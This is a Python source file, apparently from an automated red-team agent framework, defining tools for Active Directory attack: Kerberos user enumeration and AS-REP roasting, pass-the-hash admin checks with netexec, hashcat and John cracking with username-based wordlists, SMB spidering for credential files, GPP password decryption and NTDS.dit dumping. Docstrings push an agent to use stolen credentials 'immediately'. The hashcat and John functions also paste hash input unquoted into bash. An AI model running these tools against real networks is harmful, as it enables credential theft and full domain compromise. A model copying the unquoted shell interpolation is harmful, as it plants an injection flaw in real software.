            remote_temp_file = ""
            users_payload = ""
            if users_file:
                check_cmd = ["bash", "-lc", f"test -f {shlex.quote(users_file)}"]
                check_result = run_remote(check_cmd, timeout_seconds=30)
                if check_result.return_code != 0:
                    logger.warning(
                        "[!] Users file %s not found on remote. Falling back to default list.",
                        users_file,
                    )
                    users_file = ""

            if not users_file:
                enumerated_users: list[str] = []
                if self.state and self.state.users:
                    enumerated_users = sorted(
                        {user.username for user in self.state.users if user.username}
                    )
                if not enumerated_users:
                    return (
                        "[!] No users_file provided and no enumerated users available. "
                        "Enumerate users first, then retry Kerberos no-auth with a users list."
                    )
                remote_temp_file = f"/tmp/ares-userlist-{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
                users_payload = "\n".join(enumerated_users)
                users_file = remote_temp_file

            if remote_temp_file:
                cmd_script = (
                    f"tmp_file={remote_temp_file}\n"
                    "trap 'rm -f \"$tmp_file\"' EXIT\n"
                    "cat > \"$tmp_file\" <<'EOF'\n"
                    f"{users_payload}\n"
                    "EOF\n"
                    f'impacket-GetNPUsers {domain}/ -usersfile "$tmp_file" -dc-ip {dc_ip} -no-pass\n'
                )
                cmd: list[str] = ["bash", "-lc", cmd_script]
            else:
                cmd = [
                    "impacket-GetNPUsers",
                    f"{domain}/",
                    "-usersfile",
                    users_file,
                    "-dc-ip",
                    dc_ip,
                    "-no-pass",
                ]

            logger.info(f"[*] Kerberos user recon (no-auth) against {domain} via {dc_ip}")
            if self.state and hasattr(self.state, "add_domain"):
                self.state.add_domain(domain)
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)
            output = (stdout or "") + ("\n" + stderr if stderr else "")

            validated: set[str] = set()
            for line in output.splitlines():
                if "User " not in line:
                    continue
                if any(
                    marker in line
                    for marker in (
                        "UF_DONT_REQUIRE_PREAUTH",
                        "KDC_ERR_CLIENT_REVOKED",
                        "doesn't have UF_DONT_REQUIRE_PREAUTH set",
                        "does not have UF_DONT_REQUIRE_PREAUTH set",
                    )
                ):
                    match = re.search(r"User\s+([^\s]+)", line)
                    if match:
                        validated.add(match.group(1))

            if validated and self.state:
                existing = {user.username.lower() for user in self.state.users}
                for username in sorted(validated):
                    if username.lower() in existing:
                        continue
                    self.state.users.append(
                        User(
                            username=username,
                            domain=domain,
                            description="validated via Kerberos (no-auth)",
                        )
                    )
                    logger.info(
                        "[+] Recorded user from Kerberos no-auth: %s@%s",
                        username,
                        domain,
                    )

            if validated:
                summary = ", ".join(sorted(validated))
                users_file = f"/tmp/users_kerberos_{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
                ok, error = write_users_file_remote(sorted(validated), users_file)
                if ok:
                    file_note = f"\nUsers file: {users_file}"
                else:
                    file_note = f"\n[!] Failed to write users file on remote: {error}"
                result = (
                    f"\u2713 Valid principals (Kerberos no-auth): {summary}{file_note}\n\n{output}"
                )
            else:
                result = output

            if self.state and output:
                matches = re.findall(
                    r"(\$krb5asrep\$\d+\$[^\s:$]+@[^\s:$]+:[0-9a-fA-F]{32}\$[0-9a-fA-F]+)",
                    output,
                )
                for value in matches:
                    username_value = "Unknown"
                    domain_value = ""
                    parts = value.split("$", 3)
                    if len(parts) >= 4:
                        user_realm_part = parts[3]
                        user_realm = user_realm_part.split(":", 1)[0]
                        if "@" in user_realm:
                            username_value, domain_value = user_realm.split("@", 1)
                        elif user_realm:
                            username_value = user_realm
                    hash_obj = Hash(
                        username=username_value,
                        hash_value=value,
                        hash_type="AS-REP",
                        domain=domain_value or domain,
                    )
                    if hasattr(self.state, "add_hash"):
                        self.state.add_hash(hash_obj, "kerberos_noauth")
                    else:
                        self.state.hashes.append(hash_obj)

            return result

        except Exception as e:
            return f"Kerberos user recon (no-auth) failed: {e!s}"

    @dn.tool_method
    def asrep_roast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform AS-REP roasting attack to find users without Kerberos pre-authentication.

        AS-REP roasting targets users with "Do not require Kerberos preauthentication"
        enabled. This misconfiguration allows extracting AS-REP hashes that can be
        cracked offline to obtain user passwords.

        Args:
            domain: Target domain (e.g., 'example.local')
            username: Valid domain username (for recon)
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            AS-REP hashes for vulnerable user accounts

        Example:
            >>> asrep_roast("example.local", "user", "pass", "192.168.1.100")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "impacket-GetNPUsers",
            f"{domain}/{username}:{resolved_password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] AS-REP roasting {domain} using {username}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
            output = stdout or stderr or ""

            if self.state and output:
                matches = re.findall(
                    r"(\$krb5asrep\$\d+\$[^\s:$]+@[^\s:$]+:[0-9a-fA-F]{32}\$[0-9a-fA-F]+)",
                    output,
                )
                for value in matches:
                    username_value = "Unknown"
                    domain_value = ""
                    parts = value.split("$", 3)
                    if len(parts) >= 4:
                        user_realm_part = parts[3]
                        user_realm = user_realm_part.split(":", 1)[0]
                        if "@" in user_realm:
                            username_value, domain_value = user_realm.split("@", 1)
                        elif user_realm:
                            username_value = user_realm
                    hash_obj = Hash(
                        username=username_value,
                        hash_value=value,
                        hash_type="AS-REP",
                        domain=domain_value,
                    )
                    if hasattr(self.state, "add_hash"):
                        self.state.add_hash(hash_obj, "asrep_roast")
                    else:
                        self.state.hashes.append(hash_obj)

            return output

        except Exception as e:
            return f"AS-REP roasting failed: {e!s}"

    @dn.tool_method
    def domain_admin_checker(
        self,
        targets: str,
        username: str,
        password: str = "",
        hash: str = "",
    ) -> str:
        """
        Check if a compromised account has domain admin privileges across multiple targets.

        This tool is CRITICAL for identifying domain admin access. When you find an
        Administrator hash or password, IMMEDIATELY use this tool to check ALL targets.
        Look for "Pwn3d!" in the output which indicates administrative access.

        Args:
            targets: Space-separated IP addresses to check
            username: Username for authentication
            password: Password for authentication (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)

        Returns:
            Results showing which targets the account has admin access on

        Example:
            >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", password="P@ss")  # pragma: allowlist secret
            >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", hash="aad3b4...")
        """
        resolved_password = self._resolve_password(username, "", password or None)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        try:
            cmd = ["netexec", "smb"] + targets.split(" ")

            if resolved_password:
                logger.info(f"[*] Domain admin checker using password for {username}")
                cmd.extend(["-u", username, "-p", resolved_password])
            elif hash:
                logger.info(f"[*] Domain admin checker using hash for {username}")
                cmd.extend(["-u", username, "-H", hash])
            else:
                return "[!] Error: Either password or hash must be provided"

            cmd.extend(["-x", "whoami"])

            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            output = stdout
            if stderr:
                output += "\n" + stderr if output else stderr

            logger.info(f"[*] Domain admin check completed for {targets}")
            return output

        except Exception as e:
            logger.error(f"Domain admin checker failed: {e}")
            return f"Domain admin checker failed: {e}"


class CrackingTools(Toolset):
    """Tools for password hash cracking."""

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _build_user_wordlist(self) -> str | None:
        if not self.state:
            return None

        usernames = self._collect_usernames_from_state()
        words = self._generate_password_candidates(usernames)

        if not words:
            return None

        import tempfile

        wordlist_path = f"{tempfile.gettempdir()}/ares_users_{int(time.time())}.txt"
        with open(wordlist_path, "w", encoding="ascii") as handle:
            handle.writelines(f"{word}\n" for word in sorted(words))

        return wordlist_path

    def _collect_usernames_from_state(self) -> set[str]:
        """Collect usernames from state objects."""
        usernames: set[str] = set()
        if not self.state:
            return usernames
        state = self.state
        if hasattr(state, "all_users"):
            for user in state.all_users:
                if user.username:
                    usernames.add(user.username)
        if hasattr(state, "all_credentials"):
            for cred in state.all_credentials:
                if cred.username:
                    usernames.add(cred.username)
        if hasattr(state, "all_hashes"):
            for hash_obj in state.all_hashes:
                if hash_obj.username:
                    usernames.add(hash_obj.username)
        return usernames

    def _generate_password_candidates(self, usernames: set[str]) -> set[str]:
        """Generate password candidates from usernames."""
        words: set[str] = set()
        suffixes = ("", "1", "123", "!", "2024", "2025")

        for username_raw in sorted(usernames):
            username = (username_raw or "").strip()
            if not username or username.lower() in {"guest"}:
                continue
            if "/" in username or "\\" in username or username.endswith(".txt"):
                continue

            base = username.lower()
            parts = [p for p in re.split(r"[^a-z0-9]+", base) if p]

            candidates = {base}
            candidates.update(parts)
            if len(parts) >= 2:
                first, last = parts[0], parts[-1]
                candidates.update(
                    {first + last, last + first, f"{first[0]}{last}", f"{first}{last[0]}"}
                )

            for cand in candidates:
                for variant in (cand, cand.capitalize(), cand.upper()):
                    for suffix in suffixes:
                        words.add(f"{variant}{suffix}")

        return words

    @dn.tool_method
    async def crack_with_hashcat(
        self,
        hash_value: str,
        hashcat_mode: int = 13100,
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_time_minutes: int = 10,
        use_dynamic_wordlist: bool = True,
    ) -> str:
        """
        Attempt to crack a password hash using hashcat (GPU-accelerated).

        Hashcat is faster than John the Ripper when GPU is available. Use this FIRST.
        Common hash modes: NTLM (1000), Kerberos TGS (13100), Kerberos AS-REP (18200).

        **IMMEDIATELY report any successful cracks - don't wait for completion.**

        Args:
            hash_value: Hash to crack
            hashcat_mode: Hashcat mode (-m parameter). Common modes:
                - 1000: NTLM
                - 13100: Kerberos TGS ($krb5tgs$)
                - 18200: Kerberos AS-REP ($krb5asrep$)
            wordlist_path: Path to wordlist file (default: rockyou.txt)
            max_time_minutes: Maximum time to spend cracking (default: 10 minutes)

        Returns:
            Cracked passwords if successful, otherwise error message

        Example:
            >>> crack_with_hashcat("aad3b435b51404ee...", 1000)  # NTLM
            >>> crack_with_hashcat("$krb5tgs$23$*user$...", 13100)  # Kerberos TGS
        """
        output = "[*] Starting hashcat...\n"

        hash_file_path = f"/tmp/hash_{time.time()}.hash"  # noqa: S108  # nosec B108
        dynamic_wordlist = self._build_user_wordlist() if use_dynamic_wordlist else None
        if dynamic_wordlist:
            wordlist_path = dynamic_wordlist
            output += f"[*] Using wordlist: {wordlist_path}\n"
            logger.info("[*] Using dynamic user-based wordlist for cracking")

        try:
            cmd = f"""
echo '{hash_value}' > {hash_file_path}
hashcat -m {hashcat_mode} -a 0 {hash_file_path} {wordlist_path} --runtime {max_time_minutes * 60} --force 2>&1 || true
hashcat -m {hashcat_mode} {hash_file_path} --show 2>&1
rm -f {hash_file_path}
"""
            stdout, stderr, _ = await asyncio.to_thread(
                run_tool,
                ["bash", "-c", cmd],
                timeout_seconds=(max_time_minutes * 60) + 60,
            )

            if stdout and ":" in stdout:
                output += "\n\u2713 CRACKED PASSWORDS:\n" + stdout
                logger.info("[+] Hashcat successfully cracked hash")
            else:
                output += "\n\u2717 No passwords cracked\n" + (stdout or stderr)

            return output

        except Exception as e:
            return output + f"\nError: {e!s}"
        finally:
            if dynamic_wordlist:
                try:
                    Path(dynamic_wordlist).unlink()
                except Exception:
                    pass

    @dn.tool_method
    async def crack_with_john(
        self,
        hash_value: str,
        hash_format: str = "krb5tgs",
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_time_minutes: int = 10,
        use_dynamic_wordlist: bool = True,
    ) -> str:
        """
        Attempt to crack a password hash using John the Ripper.

        John is reliable and works on all systems without GPU. Use when hashcat fails
        or on systems without GPU support.

        Common hash formats: krb5tgs (Kerberos TGS), krb5asrep (AS-REP), nt (NTLM).

        Args:
            hash_value: Hash to crack
            hash_format: John format (--format parameter)
            wordlist_path: Path to wordlist file (default: rockyou.txt)
            max_time_minutes: Maximum time to spend cracking (default: 10 minutes)

        Returns:
            Cracked passwords if successful, otherwise error message

        Example:
            >>> crack_with_john("$krb5tgs$23$*user$...", "krb5tgs")
        """
        output = "[*] Starting John the Ripper...\n"

        hash_file_path = f"/tmp/john_hash_{time.time()}.hash"  # noqa: S108  # nosec B108
        dynamic_wordlist = self._build_user_wordlist() if use_dynamic_wordlist else None
        if dynamic_wordlist:
            wordlist_path = dynamic_wordlist
            output += f"[*] Using wordlist: {wordlist_path}\n"
            logger.info("[*] Using dynamic user-based wordlist for cracking")

        try:
            cmd = f"""
echo '{hash_value}' > {hash_file_path}
timeout {max_time_minutes * 60}s john --format={hash_format} --wordlist={wordlist_path} {hash_file_path} 2>&1 || true
john --show --format={hash_format} {hash_file_path} 2>&1
rm -f {hash_file_path}
"""
            stdout, stderr, _ = await asyncio.to_thread(
                run_tool,
                ["bash", "-c", cmd],
                timeout_seconds=(max_time_minutes * 60) + 60,
            )

            if stdout and ":" in stdout:
                output += "\n\u2713 CRACKED PASSWORDS:\n" + stdout
                logger.info("[+] John successfully cracked hash")
            else:
                output += "\n\u2717 No passwords cracked\n" + (stdout or stderr)

            return output

        except Exception as e:
            return output + f"\nError: {e!s}"
        finally:
            if dynamic_wordlist:
                try:
                    Path(dynamic_wordlist).unlink()
                except Exception:
                    pass


class SharePilferingTools(Toolset):
    """Tools for searching SMB shares for sensitive files and credentials."""

    state: AnyRedTeamState | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    @dn.tool_method
    def smbclient_spider(
        self,
        target: str,
        share: str,
        username: str,
        password: str,
        domain: str,
        pattern: str = "*.txt,*.xml,*.ini,*.cfg,*.ps1,*.bat,*.cmd,*.kdbx,*.config",
        depth: int = 5,
    ) -> str:
        """
        Spider an SMB share for interesting files containing credentials.

        Searches recursively through shares looking for configuration files,
        scripts, and other files that commonly contain credentials.

        Args:
            target: Target host IP
            share: Share name to spider
            username: Username for authentication
            password: Password for authentication
            domain: Domain for authentication
            pattern: File patterns to search for (comma-separated)
            depth: Maximum directory depth to search

        Returns:
            List of interesting files found

        Example:
            >>> smbclient_spider("192.168.56.10", "SYSVOL", "user", "pass", "domain.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "netexec",
            "smb",
            target,
            "-u",
            username,
            "-p",
            resolved_password or "",
            "-d",
            domain,
            "-M",
            "spider_plus",
            "-o",
            "DOWNLOAD_FLAG=False",
        ]

        try:
            logger.info(f"[*] Spidering share {share} on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            interesting_extensions = [".txt", ".xml", ".ini", ".cfg", ".ps1", ".config", ".kdbx"]
            interesting_files = []
            for line in result.splitlines():
                for ext in interesting_extensions:
                    if ext in line.lower():
                        interesting_files.append(line.strip())
                        break

            if interesting_files:
                result = (
                    "\ud83d\udcc1 INTERESTING FILES FOUND:\n"
                    + "\n".join(interesting_files[:50])
                    + "\n\n"
                    + result
                )

            return result

        except Exception as e:
            return f"Share spider failed: {e}"

    @dn.tool_method
    def gpp_password_finder(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
    ) -> str:
        """
        Search for Group Policy Preferences passwords (MS14-025).

        GPP passwords were encrypted with a known AES key and can be trivially
        decrypted. Common in older environments or those that haven't been cleaned up.

        Args:
            target: Domain controller IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for authentication

        Returns:
            Decrypted GPP passwords if found

        Example:
            >>> gpp_password_finder("192.168.56.10", "user", "pass", "domain.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "netexec",
            "smb",
            target,
            "-u",
            username,
            "-p",
            resolved_password or "",
            "-d",
            domain,
            "-M",
            "gpp_password",
        ]

        try:
            logger.info(f"[*] Searching for GPP passwords in {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)

            result = stdout + "\n" + (stderr or "")

            if "password" in result.lower() or "cpassword" in result.lower():
                logger.warning("[!] GPP passwords found!")
                result = (
                    "\ud83d\udea8 GPP PASSWORDS FOUND!\n"
                    "\u2192 These are decrypted Group Policy Preferences passwords\n"
                    "\u2192 Use found credentials immediately\n\n" + result
                )

            return result

        except Exception as e:
            return f"GPP password search failed: {e}"

    @dn.tool_method
    def ntds_dit_extract(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
    ) -> str:
        """
        Extract NTDS.dit database for offline hash extraction.

        This extracts the Active Directory database which contains all domain
        user hashes. Use when you have Domain Admin access.

        **WARNING**: This is very noisy and will be logged. Use secretsdump first.

        Args:
            target: Domain controller IP
            username: Domain Admin username
            password: Password (optional if using hash)
            hash: NTLM hash (optional if using password)
            domain: Domain name

        Returns:
            NTDS extraction results

        Example:
            >>> ntds_dit_extract("192.168.56.10", "Administrator", password="P@ss", domain="domain.local")  # pragma: allowlist secret
        """
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if resolved_password and domain:
            target_string = f"{domain}/{username}:{resolved_password}@{target}"
        elif resolved_password:
            target_string = f"{username}:{resolved_password}@{target}"
        elif hash and domain:
            target_string = f"{domain}/{username}@{target}"
        elif hash:
            target_string = f"{username}@{target}"
        else:
            return "[!] Error: Either password or hash must be provided"

        cmd = ["impacket-secretsdump", "-ntds", "drsuapi"]
        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        cmd.append(target_string)

        try:
            logger.info(f"[*] Extracting NTDS.dit from {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=600)

            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"NTDS extraction failed: {e}"
